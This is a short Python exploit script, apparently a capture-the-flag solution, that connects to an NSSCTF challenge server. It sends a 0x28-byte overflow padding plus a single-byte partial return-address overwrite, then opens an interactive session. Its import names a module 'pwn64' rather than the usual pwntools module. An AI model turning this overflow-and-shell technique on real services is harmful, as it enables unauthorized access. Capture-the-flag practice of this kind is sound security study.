from pwn64 import *
p = remote('node6.anna.nssctf.cn',22606)
payload = b'a'*0x28 + p8(0xc2)
p.send(payload)
p.interactive()